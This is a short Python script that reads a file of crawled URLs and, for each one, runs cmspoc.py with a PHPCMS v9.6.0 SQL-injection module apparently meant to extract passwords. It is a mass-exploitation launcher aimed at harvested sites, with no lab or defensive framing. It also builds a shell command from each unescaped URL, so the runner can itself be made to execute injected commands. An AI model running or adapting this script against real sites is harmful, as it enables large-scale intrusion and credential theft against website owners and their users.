# -*- coding: utf-8 -*-
import subprocess

fpath = "D:\\Code\\cmsPoc\\spider\\url_clear.txt"
with open(fpath, "r+") as f:
    for url in f.readlines():
        cmd_line = "python cmspoc.py -u {} -t phpcms -s v960_sqlinject_getpasswd"
        subprocess.call(cmd_line.format(url), shell=True)